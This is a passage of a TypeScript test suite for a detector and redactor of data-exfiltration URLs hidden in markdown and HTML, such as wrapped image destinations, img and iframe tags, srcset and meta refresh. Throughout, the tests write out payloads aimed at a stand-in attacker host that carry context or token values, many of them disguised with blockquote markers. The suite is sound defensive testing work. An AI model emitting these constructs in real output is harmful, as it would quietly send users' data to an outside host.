    `![foo bar]\n\n[foo bar]: https://ok.example.org/x\n`;
  const matches = detectExfil(content, []);
  expect(matches.some((m) => m.value === attackerUrl)).toBe(false);
  expect(matches.some((m) => m.value === "https://ok.example.org/x")).toBe(true);
});

test("T92: controls are unaffected — a genuine full reference, a genuine collapsed reference, and a label that legitimately wraps without any marker all still resolve exactly as before", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const controls: Record<string, string> = {
    genuineFullReference_sameLine: `![alt][foo bar]\n\n[foo bar]: ${U}\n`,
    genuineCollapsed_sameLine: `![foo bar][]\n\n[foo bar]: ${U}\n`,
    genuineShortcut_sameLine: `![foo bar]\n\n[foo bar]: ${U}\n`,
    // A label that wraps across a line with NO container marker at all: the
    // second bracket's raw content is real text, not a marker, so this must
    // stay on the full-reference branch exactly as before T92.
    realLabelWrapsNoMarker: `![alt][foo\nbar]\n\n[foo bar]: ${U}\n`,
    // T91's own already-covered shape: a label that wraps BEHIND a marker
    // but carries real text alongside it, inside a matching container.
    realLabelWrapsBehindMarker_T91: `> ![alt][foo\n> bar]\n>\n> [foo bar]: ${U}\n`,
  };
  for (const [id, content] of Object.entries(controls)) {
    const matches = detectExfil(content, []);
    expect(`${id}:${matches.length}`).toBe(`${id}:1`);
    expect(`${id}:${matches[0]?.value}`).toBe(`${id}:${U}`);
  }
});

// COST (T92). `spanHasNonWhitespace` now slices and strips a span that
// crosses a line terminator, charged against the SAME `budget.work` counter
// `readLabel` already charges — see the comment above it in exfil.ts for why
// that reuse, not a new independent budget, is what keeps this linear. Two
// shapes stress the two ways this file has gone quadratic before:
//   - many opening brackets sharing the IDENTICAL second-bracket span (the
//     `"[".repeat(n) + "](URL)"` amplification `readInlineDestination`'s own
//     comment describes, replayed here with a marker-only second bracket
//     instead of a destination) — the shape that would make an unmemoised,
//     unbudgeted strip-and-check O(n · width);
//   - many INDEPENDENT marker-only second brackets at megabyte scale — the
//     realistic worst case, one budget charge per distinct span.
test("T92: the second-bracket emptiness check is linear — megabyte-scale shared and independent marker-only second brackets complete well under a second", () => {
  const BUDGET_MS = 900;
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const nestedMarker = "> - 1. ".repeat(40); // 280 bytes, deeply nested, alternating
  const sharedOpens = 250000; // every one shares the SAME second-bracket span
  const independentCount = 6000; // ~1 MB across many distinct marker-only spans
  const shapes: Record<string, string> = {
    // T78#F-001/T84#F-001's own amplification shape: `sharedOpens` unclosed
    // `![` opens all resolve their "first `]`" to the SAME single close, so
    // every one of them asks `spanHasNonWhitespace` about the IDENTICAL
    // (start, end) pair.
    manyOpensSharingOneMarkerOnlySecondBracket:
      "![".repeat(sharedOpens) +
      `x][\n${nestedMarker}]\n\n[x]: https://ok.example.org/x\n`,
    manyIndependentMarkerOnlySecondBrackets: Array.from(
      { length: independentCount },
      (_, i) => `![k${i}][\n${nestedMarker}]\n\n[k${i}]: https://ok.example.org/x\n`,
    ).join(""),
    // The real bypass shape at scale: many independent, allowlisted,
    // marker-only-second-bracket shortcuts, then one carrying the attacker
    // host, to prove the finding still surfaces under cost pressure.
    manyThenAttacker:
      Array.from(
        { length: independentCount },
        (_, i) => `![k${i}][\n${nestedMarker}]\n\n[k${i}]: https://ok.example.org/x\n`,
      ).join("") + `![target][\n${nestedMarker}]\n\n[target]: ${U}\n`,
  };
  const slow: string[] = [];
  const timings: string[] = [];
  for (const [id, text] of Object.entries(shapes)) {
    const started = performance.now();
    const matches = detectExfil(text, []);
    const elapsed = performance.now() - started;
    timings.push(`${id}: ${text.length} bytes in ${elapsed.toFixed(1)}ms`);
    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
    if (id === "manyThenAttacker") {
      expect(matches.some((m) => m.value === U)).toBe(true);
    }
  }
  console.log("T92 cost measurement:\n" + timings.join("\n"));
  expect(slow).toEqual([]);
});

// T92 direction, exercised rather than only argued. `spanHasNonWhitespace`
// charges the SAME `budget.work` counter `readLabel` does, and on exhaustion
// it answers `true` (never seen precisely) rather than `false` (guessed
// empty) — see the comment above the function for why either choice is safe,
// because `budget.exhausted` alone is what triggers `detectExfil`'s
// flag-every-definition fallback (T78#F-001). This shape is arithmetically
// guaranteed to exhaust the budget FROM spanHasNonWhitespace's own charging,
// not from readLabel's: `sharedOpens` (250 000) images share one
// ~281-byte second-bracket span (the same amplification as the cost test
// above), so the span is charged repeatedly long before all opens are
// visited — budget.work starts at `LABEL_WORK_FACTOR * content.length`
// (~8 × 500 KB ≈ 4.0M) and is consumed after roughly 4.0M / 281 ≈ 14 300
// charges, a small fraction of the 250 000 opens sharing that span — well
// before the scan ever reaches the SEPARATE, later attacker construct. The
// attacker's finding therefore cannot come from ordinary resolution of ITS
// OWN construct in the normal case; this test is what tells the two apart
// from the exhaustion fallback and confirms the fallback still fires.
test("T92: when the second-bracket check itself exhausts the shared budget, the fallback still flags the attacker construct — never a release", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const nestedMarker = "> - 1. ".repeat(40);
  const sharedOpens = 250000;
  const content =
    "![".repeat(sharedOpens) +
    `x][\n${nestedMarker}]\n\n[x]: https://ok.example.org/x\n` +
    `![target][\n${nestedMarker}]\n\n[target]: ${U}\n`;
  const matches = detectExfil(content, []);
  expect(matches.some((m) => m.value === U)).toBe(true);
  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
});

// ---------------------------------------------------------------------------
// T93 — the CLASS, not its fifth member.
//
// Four rounds (T89, T90, T91, T92) each closed ONE reader that crosses a line
// terminator without consuming the block-container marker a renderer repeats on
// the continuation line, and each declared the class closed. The enumeration
// this round required found five more members, in two families:
//
//   A. the markdown INLINE destination (`![a](\n> URL)`) — `INLINE_DESTINATION`
//      crossed the newline through its own `\s*` prefix and took the marker byte
//      as the destination, exactly the way `REFERENCE_DESTINATION` did before
//      T90. Closed the same way T90 closed that one: by calling
//      `skipDestinationLeadingWhitespace`, the SAME helper, rather than by
//      writing a sixth spelling of the marker grammar.
//   B-E. four HTML readers — the start tag's attribute-list whitespace skips
//      (`<img\n> src=…>`), the quoted attribute VALUE (`src="https://\n> host/"`),
//      the `srcset` candidate list, and the `<meta refresh>` directive. These
//      are NOT closed one by one: the HTML pass is run a second time over the
//      renderer's OWN view of the document — the content with block-container
//      prefixes removed — with every offset mapped back to the original bytes.
//      Any future HTML reader is covered by construction.
//
// Every case below was measured against `marked` in a scratch probe before it
// was written here (renderer fetches / detector found nothing), not inferred.
// ---------------------------------------------------------------------------

// FAMILY A. The inline destination wraps and the continuation line repeats the
// container marker. `marked` resolves the image through the repeated marker and
// emits `<img src="https://attacker.invalid/…">`; the floor produced ZERO
// findings, because `\s*` landed on the `>` and `[^)\s]+` took that one byte as
// the whole destination.
test("T93: an inline image destination that wraps behind a repeated container marker is a finding", () => {
  const U = `https://${ATTACKER}/p.png?ctx=CTX`;
  const shapes: Record<string, string> = {
    blockquoteBare: `> ![a](\n> ${U})\n`,
    blockquoteAngle: `> ![a](\n> <${U}>)\n`,
    blockquoteCrlf: `> ![a](\r\n> ${U})\r\n`,
    blockquoteNested: `> > ![a](\n> > ${U})\n`,
    blockquoteTab: `> ![a](\n>${TAB}${U})\n`,
    blockquoteImageInLink: `> [![a](\n> ${U})](https://ok.example.org/c)\n`,
    blockquoteExtraSpaces: `>   ![a](\n>   ${U}   )\n`,
  };
  const released: string[] = [];
  for (const [id, content] of Object.entries(shapes)) {
    const matches = detectExfil(content, []);
    const found = matches.some((m) => m.value.includes(ATTACKER));
    const redacted = applyRedaction(content, matches);
    if (!found || redacted.includes(ATTACKER)) released.push(id);
  }
  expect(released).toEqual([]);
});

// Direction, family A: the same wrap with no container marker on the
// continuation line, and ordinary same-line destinations, are unchanged.
test("T93: family-A controls are unaffected — same-line destinations, an unprefixed wrap, an allowlisted host and an empty destination", () => {
  const U = `https://${ATTACKER}/p.png`;
  expect(detectExfil(`![a](${U})`, []).length).toBe(1);
  expect(detectExfil(`> ![a](\n${U})\n`, []).length).toBe(1);
  expect(detectExfil(`> ![a](\n> ${U})\n`, ["ok.example.org"]).length).toBe(1);
  expect(
    detectExfil(`> ![a](\n> https://ok.example.org/p.png)\n`, ["ok.example.org"])
      .length,
  ).toBe(0);
  expect(detectExfil(`> ![a](\n> )\n`, []).length).toBe(0);
  expect(detectExfil(`![a]()`, []).length).toBe(0);
  expect(detectExfil(`![a](   )`, []).length).toBe(0);
  // A link's destination still needs a credential locator to be a finding.
  expect(detectExfil(`> [a](\n> ${U})\n`, []).length).toBe(0);
  expect(
    detectExfil(`> [a](\n> https://${ATTACKER}/x?token=SECRET)\n`, []).length,
  ).toBe(1);
});

// FAMILY B-E. Four HTML readers, closed by one container-stripped view rather
// than by four edits. Each shape below was measured fetching in `marked` and
// producing zero findings here.
test("T93: every HTML reader that crosses a line terminator is covered by the container-stripped view", () => {
  const U = `https://${ATTACKER}/p.png`;
  const shapes: Record<string, string> = {
    // B — the attribute-list whitespace skips: the `>` a renderer strips as a
    // blockquote marker is what `readStartTag` reads as the end of the tag.
    tagWrapQuoted: `> <img\n> src="${U}">\n`,
    tagWrapIframe: `> <iframe\n> src="${U}"></iframe>\n`,
    tagWrapCrlf: `> <img\r\n> src="${U}">\r\n`,
    tagWrapBeforeValue: `> <img src=\n> "${U}">\n`,
    tagWrapVideoPoster: `> <video\n> poster="${U}"></video>\n`,
    tagWrapBase: `> <base\n> href="${U}">\n`,
    // C — the quoted attribute VALUE itself wraps.
    valueWrap: `> <img src="https://\n> ${ATTACKER}/p.png">\n`,
    valueWrapNested: `> > <img src="https://\n> > ${ATTACKER}/p.png">\n`,
    // D — a `srcset` candidate wraps.
    srcsetWrap: `> <img srcset="a.png 1x,\n> ${U} 2x">\n`,
    // E — the `<meta http-equiv=refresh>` directive wraps.
    metaRefreshWrap: `> <meta http-equiv="refresh" content="0;url=\n> ${U}">\n`,
  };
  const released: string[] = [];
  for (const [id, content] of Object.entries(shapes)) {
    const matches = detectExfil(content, []);
    const found = matches.length > 0;
    const redacted = applyRedaction(content, matches);
    if (!found || redacted.includes(ATTACKER)) released.push(id);
  }
  expect(released).toEqual([]);
});

// Offsets. A finding the stripped view produced must report a span in the
// ORIGINAL bytes — never one in the rewritten copy — so `content.slice(start,
// end)` must be exactly the finding's own value, and redaction must remove the
// attacker host from the original text.
test("T93: findings from the container-stripped view carry offsets into the ORIGINAL bytes", () => {
  const U = `https://${ATTACKER}/p.png`;
  for (const content of [
    `> <img\n> src="${U}">\n`,
    `> <img src="https://\n> ${ATTACKER}/p.png">\n`,
    `> <img srcset="a.png 1x,\n> ${U} 2x">\n`,
    `> <meta http-equiv="refresh" content="0;url=\n> ${U}">\n`,
    `> ![a](\n> ${U})\n`,
  ]) {
    const matches = detectExfil(content, []);
    expect(matches.length).toBeGreaterThan(0);
    for (const match of matches) {
      expect(match.start).toBeGreaterThanOrEqual(0);
      expect(match.end).toBeLessThanOrEqual(content.length);
      expect(content.slice(match.start, match.end)).toBe(match.value);
    }
    expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
  }
});

// Direction, families B-E: the view only ADDS. Every ordinary HTML shape keeps
// exactly the findings it had, at exactly the offsets it had, and a document
// with no container marker anywhere never builds a view at all.
test("T93: HTML controls are unaffected — no-container documents, allowlisted hosts, and quoted-attribute markup stay exactly as they were", () => {
  const U = `https://${ATTACKER}/p.png`;
  expect(detectExfil(`<img src="${U}">`, []).length).toBe(1);
  expect(detectExfil(`> <img src="${U}">`, []).length).toBe(1);
  expect(detectExfil(`> <img src="${U}">`, [ATTACKER]).length).toBe(0);
  expect(detectExfil(`> <img\n> src="${U}">\n`, [ATTACKER]).length).toBe(0);
  // T53#F-004: markup written inside another element's quoted attribute value
  // is still not an element, view or no view.
  expect(
    detectExfil(`> <img alt="<img src=${U}>" src="/a.png">\n`, []).length,
  ).toBe(0);
  // A non-image input's `src` still fetches nothing, across a wrap.
  expect(detectExfil(`> <input\n> type="text" src="${U}">\n`, []).length).toBe(0);
  expect(detectExfil(`> <input\n> type="image" src="${U}">\n`, []).length).toBe(1);
});

// Over-approximation is preserved in the direction this floor is allowed to err:
// a wrapped construct a renderer would NOT resolve is still flagged, never
// released.
test("T93: shapes the renderer does not resolve are still flagged, not released — over-approximation, not a contract", () => {
  const U = `https://${ATTACKER}/p.png`;
  // `marked` splits these into separate list items and emits no image, but the
  // floor does not model block structure and flags them anyway.
  expect(detectExfil(`- ![a](\n- ${U})\n`, []).length).toBeGreaterThan(0);
  expect(detectExfil(`1. ![a](\n1. ${U})\n`, []).length).toBeGreaterThan(0);
  expect(detectExfil(`- <img\n- src="${U}">\n`, []).length).toBeGreaterThan(0);
  // Inside a fenced code block, same as T89/T90/T91/T92.
  expect(
    detectExfil("```\n> <img\n> src=\"" + U + "\">\n```\n", []).length,
  ).toBeGreaterThan(0);
});

// COST. The dangerous shape is many constructs sharing one span, which is what
// bit every earlier round on this file. A megabyte of each newly covered shape
// must complete well under a second.
test("T93: the newly covered shapes are linear — megabyte-scale adversarial input completes well under a second", () => {
  const BUDGET_MS = 900;
  const U = `https://${ATTACKER}/p.png`;
  const nested = "> - 1. ".repeat(40); // 280 bytes of alternating markers
  const shapes: Record<string, string> = {
    // Family A at scale, and its amplification shape: many opens sharing ONE
    // description end, so every one of them asks the destination reader about
    // the identical offset.
    manyOpensSharingOneWrappedDestination:
      "![".repeat(200000) + `x](\n${nested}${U})\n`,
    manyIndependentWrappedDestinations: Array.from(
      { length: 3500 },
      () => `> ![a](\n${nested}https://ok.example.org/p.png)\n`,
    ).join(""),
    // Families B-E at scale: a megabyte of container-prefixed lines, so the
    // view is built for the whole document and the HTML pass runs twice.
    megabyteOfContainerPrefixedLines: `${nested}x\n`.repeat(3500),
    manyWrappedTags: Array.from(
      { length: 23000 },
      () => `> <img\n> src="https://ok.example.org/p.png">\n`,
    ).join(""),
    manyWrappedTagsThenAttacker:
      Array.from(
        { length: 23000 },
        () => `> <img\n> src="https://ok.example.org/p.png">\n`,
      ).join("") + `> <img\n> src="${U}">\n`,
    // Unterminated tags on container-prefixed lines: the shape that makes a
    // marker-consuming tag walk quadratic if it is written as a rescan.
    manyUnterminatedTagsOnMarkerLines: `> <img\n`.repeat(120000),
  };
  const slow: string[] = [];
  const timings: string[] = [];
  for (const [id, text] of Object.entries(shapes)) {
    const started = performance.now();
    const matches = detectExfil(text, []);
    const elapsed = performance.now() - started;
    timings.push(`${id}: ${text.length} bytes in ${elapsed.toFixed(1)}ms`);
    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
    if (id === "manyWrappedTagsThenAttacker") {
      expect(matches.some((m) => m.value.includes(ATTACKER))).toBe(true);
    }
  }
  console.log("T93 cost measurement:\n" + timings.join("\n"));
  expect(slow).toEqual([]);
});

// ---------------------------------------------------------------------------
// T93 GUARD — the part of this round that outlives it.
//
// Four rounds fixed four readers and each declared the class closed. What was
// missing was never a better fix; it was a way for the invariant to be VISIBLE.
// "Every reader that crosses a line terminator must consume the block-container
// marker a renderer repeats on the continuation line" is an invisible rule: it
// lives in four function comments, and a fifth reader added anywhere in the
// file joins the class without a single test going red.
//
// Two guards make it visible, from opposite directions.
//
//   GUARD 1 (source census, below) enumerates every reader in the file FROM THE
//   SOURCE — every regex literal that can match a line terminator, and every
//   call site of the three predicates that decide whether a scan may step over
//   one — and requires each to carry a recorded verdict here. A new reader, an
//   edited reader, or a reader that changes its line-crossing classification
//   turns this red. It cannot be satisfied by accident: the registry keys are
//   the reader's own source text.
//
//   GUARD 2 (metamorphic, below) needs no enumeration at all. It asserts the
//   property the whole class violates: this floor must be AT LEAST AS CAPABLE
//   on a document as it is on the renderer's own view of that document. A
//   marker-blind reader breaks it by construction, whether or not anyone
//   remembered to register it.
// ---------------------------------------------------------------------------

const EXFIL_SOURCE_PATH =
  process.env.KERYX_EXFIL_AUDIT_SOURCE ??
  path.join(path.dirname(fileURLToPath(import.meta.url)), "exfil.ts");

type RegexSite = { name: string | null; source: string; flags: string };

// Walk the module's source, skipping comments and string literals, and return
// every regex literal with the `const NAME =` it was bound to (or null when it
// was written inline). Hand-rolled for the same reason `readStartTag` is: a
// character class cannot tell a regex literal from a division or from a `/`
// inside a string, and a census that misses a reader is a census that lets the
// next member of this class in silently.
function scanRegexLiterals(source: string): {
  sites: RegexSite[];
  code: string;
} {
  const sites: RegexSite[] = [];
  let code = "";
  let index = 0;
  let lastSignificant = "";
  while (index < source.length) {
    const ch = source[index] as string;
    const next = source[index + 1];
    if (ch === "/" && next === "/") {
      while (index < source.length && source[index] !== "\n") index += 1;
      continue;
    }
    if (ch === "/" && next === "*") {
      index += 2;
      while (
        index < source.length &&
        !(source[index] === "*" && source[index + 1] === "/")
      ) {
        index += 1;
      }
      index += 2;
      continue;
    }
    if (ch === '"' || ch === "'" || ch === "`") {
      let at = index + 1;
      while (at < source.length) {
        if (source[at] === BS) {
          at += 2;
          continue;
        }
        if (source[at] === ch) break;
        at += 1;
      }
      code += source.slice(index, at + 1);
      lastSignificant = ch;
      index = at + 1;
      continue;
    }
    // A `/` opens a regex literal exactly where an operand may start, i.e. when
    // the previous significant character cannot END one.
    if (ch === "/" && !/[A-Za-z0-9_$)\]]/.test(lastSignificant)) {
      let at = index + 1;
      let inClass = false;
      while (at < source.length) {
        const c = source[at] as string;
        if (c === BS) {
          at += 2;
          continue;
        }
        if (c === "[") inClass = true;
        else if (c === "]") inClass = false;
        else if (c === "/" && !inClass) break;
        else if (c === "\n") break;
        at += 1;
      }
      let flagsEnd = at + 1;
      while (flagsEnd < source.length && /[a-z]/.test(source[flagsEnd] as string)) {
        flagsEnd += 1;
      }
      const name =
        /const ([A-Z][A-Z0-9_]*)\s*(?::[^=]*)?=\s*$/.exec(code.slice(-200))?.[1] ??
        null;
      sites.push({
        name,
        source: source.slice(index + 1, at),
        flags: source.slice(at + 1, flagsEnd),
      });
      code += "REGEX";
      lastSignificant = "X";
      index = flagsEnd;
      continue;
    }
    if (!/\s/.test(ch)) lastSignificant = ch;
    code += ch;
    index += 1;
  }
  return { sites, code };
}

// Can this pattern match a line terminator — i.e. can a span it reads cross
// one? A NEGATED class counts unless it excludes every terminator LF, CR,
// U+2028 and U+2029, which is why `[^<>\n]` counts (it can still cross a bare
// CR) and `[^&#/?\s]` does not (`\s` excludes them all). `.` does not, without
// the `s` flag.
function canMatchLineTerminator(pattern: string, flags: string): boolean {
  const terminatorEscapes = ["\\n", "\\r", "\\u2028", "\\u2029"];
  let index = 0;
  let inClass = false;
  let classBody = "";
  let negated = false;
  while (index < pattern.length) {
    const ch = pattern[index] as string;
    if (ch === BS) {
      const token = pattern.slice(index, index + 2);
      const long = pattern.slice(index, index + 6);
      const isTerminator =
        terminatorEscapes.includes(token) || terminatorEscapes.includes(long);
      if (inClass) classBody += isTerminator ? "T" : token === "\\s" ? "S" : "";
      else if (token === "\\s" || isTerminator) return true;
      index += terminatorEscapes.includes(long) ? 6 : 2;
      continue;
    }
    if (!inClass && ch === "[") {
      inClass = true;
      negated = pattern[index + 1] === "^";
      classBody = "";
      index += negated ? 2 : 1;
      continue;
    }
    if (inClass && ch === "]") {
      inClass = false;
      if (negated) {
        // it can match a terminator unless every one of them is excluded
        if (!classBody.includes("S") && !classBody.includes("T")) return true;
        if (!classBody.includes("S")) return true; // `\n` alone leaves CR reachable
      } else if (classBody.includes("T") || classBody.includes("S")) {
        return true;
      }
      index += 1;
      continue;
    }
    if (inClass) {
      if (ch === "\n" || ch === "\r") classBody += "T";
      index += 1;
      continue;
    }
    if (ch === "." && flags.includes("s")) return true;
    if (ch === "\n" || ch === "\r") return true;
    index += 1;
  }
  return false;
}

type Verdict =
  // reads across a line terminator and consumes the repeated marker itself
  | "consumes-markers"
  // reads across a line terminator and is covered because the HTML pass is run
  // a second time over the container-stripped view
  | "covered-by-stripped-view"
  // matches a line terminator but reads no SPAN across one: a single-character
  // predicate, a single-character deletion, or a zero-width assertion
  | "no-span"
  // cannot reach a line terminator at all
  | "cannot-cross";

// EVERY regex literal in the module, with its verdict. `crosses` is what the
// classifier above must independently derive from the pattern; disagreeing with
// it is a failure, so editing a pattern to admit a line terminator cannot leave
// a stale verdict standing.
const REGEX_READERS: Record<string, { crosses: boolean; verdict: Verdict; why: string }> = {
  CHARACTER_REFERENCE: {
    crosses: false,
    verdict: "cannot-cross",
    why: "digits, hex digits and ASCII letters only — no element admits a terminator",
  },
  URL_STRIPPED_CHARACTERS: {
    crosses: true,
    verdict: "no-span",
    why: "`renderableUrl`'s single-character DELETION of tab/LF/CR; matches one terminator, reads no span across one",
  },
  UNICODE_WHITESPACE: {
    crosses: true,
    verdict: "no-span",
    why: "`isCollapsibleSpace`'s above-ASCII predicate, applied to ONE character",
  },
  BRACKET_OPEN: {
    crosses: false,
    verdict: "cannot-cross",
    why: "two literal characters, an optional `!` and a `[` — no class, no escape, nothing that admits a terminator",
  },
  INLINE_DESTINATION: {
    crosses: true,
    verdict: "consumes-markers",
    why: "T93#A — the leading run is `skipDestinationLeadingWhitespace`, the same helper T90 gave the definition destination; the bare alternative `[^)\\s]+` cannot cross, `[^)]*` is the title span and is never classified, and the angle alternative `[^<>\\n]` ends the destination at LF exactly as CommonMark does",
  },
  REFERENCE_DESTINATION: {
    crosses: true,
    verdict: "consumes-markers",
    why: "T90 — same helper, same three sub-arguments; `\\S+` cannot cross",
  },
  LABEL_WHITESPACE_RUN: {
    crosses: true,
    verdict: "consumes-markers",
    why: "T91 — runs inside `normaliseLabel` AFTER `stripBlockContainerMarkers` has consumed every repeated marker in the label",
  },
  HTML_START_TAG: {
    crosses: true,
    verdict: "no-span",
    why: "the terminator appears only in a zero-width lookahead over ONE character, the tokenizer's tag-name terminator set",
  },
  META_REFRESH_CONTENT: {
    crosses: true,
    verdict: "covered-by-stripped-view",
    why: "T93#E — `[\\s\\S]*` crosses the terminator onto the repeated marker; the directive is read again from the container-stripped view",
  },
  SENSITIVE_URL_VALUE: {
    crosses: false,
    verdict: "cannot-cross",
    why: "`[^&#/?\\s]+` excludes every whitespace character, terminators included",
  },
  SRCSET_DESCRIPTOR: {
    crosses: true,
    verdict: "covered-by-stripped-view",
    why: "T93#D — a candidate's `trim()` crosses the terminator onto the repeated marker; the value is split again from the container-stripped view",
  },
};

// EVERY call site of the three predicates that decide whether a scan may step
// over a line terminator, keyed by its own source line and counted. A new scan
// loop, or one more copy of an existing one, changes this map.
const SCAN_SITES: Record<string, { count: number; verdict: Verdict | "definition"; why: string }> = {
  "function isCollapsibleSpace(code: number, character: string): boolean {": {
    count: 1,
    verdict: "definition",
    why: "the predicate itself",
  },
  "function isHtmlSpace(character: string): boolean {": {
    count: 1,
    verdict: "definition",
    why: "the predicate itself",
  },
  "if (!isCollapsibleSpace(content.charCodeAt(index), character)) counted += 1;": {
    count: 1,
    verdict: "no-span",
    why: "`indexContent`'s per-character non-whitespace count; reads no span",
  },
  "if (lineTerminators && LINE_TERMINATORS.has(content.charCodeAt(index))) {": {
    count: 1,
    verdict: "no-span",
    why: "builds the terminator index the marker-aware readers ask questions of",
  },
  "if (LINE_TERMINATORS.has(code)) {": {
    count: 1,
    verdict: "consumes-markers",
    why: "T90 `skipDestinationLeadingWhitespace` — crosses, then calls `skipBlockContainerPrefix`",
  },
  "if (isCollapsibleSpace(code, content[at] as string)) {": {
    count: 1,
    verdict: "consumes-markers",
    why: "the same function's non-terminator branch; the terminator branch above consumes the marker",
  },
  "if (!LINE_TERMINATORS.has(code)) {": {
    count: 1,
    verdict: "consumes-markers",
    why: "T91 `stripBlockContainerMarkers` — the marker consumer for label text",
  },
  "while (at < content.length && !LINE_TERMINATORS.has(content.charCodeAt(at))) {": {
    count: 2,
    verdict: "consumes-markers",
    why: "the two line walks (`readReferenceDefinitions`, `containerStrippedView`); each calls `skipBlockContainerPrefix` at the line start it advances to",
  },
  '(isHtmlSpace(content[index] as string) || content[index] === "/")': {
    count: 1,
    verdict: "covered-by-stripped-view",
    why: "T93#B before-attribute-name — crosses onto a repeated `>`, which this reader must go on reading as the tag's own end; read again from the view instead",
  },
  "isHtmlSpace(character) ||": {
    count: 1,
    verdict: "cannot-cross",
    why: "the attribute-NAME terminator set: a name ends at a terminator, it never spans one",
  },
  "while (cursor < content.length && isHtmlSpace(content[cursor] as string)) {": {
    count: 2,
    verdict: "covered-by-stripped-view",
    why: "T93#B after-attribute-name and before-attribute-value, same argument",
  },
  "const close = content.indexOf(quote, valueStart);": {
    count: 1,
    verdict: "covered-by-stripped-view",
    why: "T93#C the quoted attribute VALUE, which crosses a terminator freely",
  },
  "!isHtmlSpace(content[valueEnd] as string) &&": {
    count: 1,
    verdict: "cannot-cross",
    why: "an unquoted attribute value ends at a terminator",
  },
};

const SCAN_PREDICATES =
  /isHtmlSpace\(|isCollapsibleSpace\(|LINE_TERMINATORS\.has\(|content\.indexOf\(/;

// GUARD 1. The census must match the registry exactly, in both directions.
test("T93 GUARD: every reader in exfil.ts that can cross a line terminator carries a recorded verdict", async () => {
  const source = await readFile(EXFIL_SOURCE_PATH, "utf8");
  const { sites, code } = scanRegexLiterals(source);

  // (a) every regex literal is a named top-level constant, so the census below
  // can see it. An inline literal is a reader with no name to register.
  expect(sites.filter((site) => site.name === null).map((s) => s.source)).toEqual([]);

  // (b) the registry's classification must equal the one derived from the
  // pattern, so editing a pattern to admit a terminator cannot leave a stale
  // verdict standing.
  const derived: Record<string, boolean> = {};
  for (const site of sites) {
    derived[site.name as string] = canMatchLineTerminator(site.source, site.flags);
  }
  const declared: Record<string, boolean> = {};
  for (const [name, entry] of Object.entries(REGEX_READERS)) {
    declared[name] = entry.crosses;
  }
  expect(derived).toEqual(declared);

  // (c) every scan site is registered, with the right multiplicity.
  const found: Record<string, number> = {};
  for (const line of code.split("\n")) {
    const key = line.trim();
    if (key.length === 0 || !SCAN_PREDICATES.test(key)) continue;
    found[key] = (found[key] ?? 0) + 1;
  }
  const registered: Record<string, number> = {};
  for (const [key, entry] of Object.entries(SCAN_SITES)) {
    registered[key] = entry.count;
  }
  expect(found).toEqual(registered);

  // (d) a verdict is a claim, so it has to say something. Every reader that
  // CAN cross must claim either that it consumes the marker itself or that the
  // container-stripped view reads it again.
  for (const [name, entry] of Object.entries(REGEX_READERS)) {
    expect(`${name}:${entry.why.length > 30}`).toBe(`${name}:true`);
    if (entry.crosses && entry.verdict === "cannot-cross") {
      throw new Error(`${name} can match a line terminator but claims it cannot`);
    }
  }
});

// GUARD 2. The property, with no enumeration: this floor must be at least as
// capable on a document as on the renderer's own view of it.
//
// The corpus is generated, not written: every known-positive template, with a
// line break plus a repeated blockquote marker inserted at EVERY position in
// it. That is the shape of every member of this class — T89's definition line,
// T90's destination, T91's label, T92's second bracket, and T93's inline
// destination and four HTML readers are all one `"\n> "` inserted at one
// offset — so a reader that forgets the marker fails here whether or not
// anyone registered it above.
test("T93 GUARD: a container-stripped view of a document never finds what the document itself does not", () => {
  const U = `https://${ATTACKER}/p.png`;
  const templates = [
    `![a](${U})`,
    `![a](<${U}>)`,
    `[![a](${U})](https://ok.example.org/c)`,
    `![a][r]\n\n[r]: ${U}`,
    `![r]\n\n[r]: ${U}`,
    `<img src="${U}">`,
    `<img srcset="a.png 1x, ${U} 2x">`,
    `<iframe src="${U}"></iframe>`,
    `<video poster="${U}"></video>`,
    `<base href="${U}">`,
    `<meta http-equiv="refresh" content="0;url=${U}">`,
    `<input type="image" src="${U}">`,
  ];
  const quote = (text: string): string =>
    "> " + text.split("\n").join("\n> ");
  const leaks: string[] = [];
  let examined = 0;
  for (const template of templates) {
    for (let at = 0; at <= template.length; at += 1) {
      const document = quote(
        template.slice(0, at) + "\n" + template.slice(at),
      );
      const view = containerStrippedView(document);
      const asRendered = detectExfil(view ? view.text : document, []);
      if (!asRendered.some((match) => match.value.includes(ATTACKER))) continue;
      examined += 1;
      const asWritten = detectExfil(document, []);
      if (!asWritten.some((match) => match.value.includes(ATTACKER))) {
        leaks.push(JSON.stringify(document));
      } else if (applyRedaction(document, asWritten).includes(ATTACKER)) {
        leaks.push(`unredacted ${JSON.stringify(document)}`);
      }
    }
  }
  expect(examined).toBeGreaterThan(100); // the corpus must not be vacuous
  expect(leaks).toEqual([]);
});
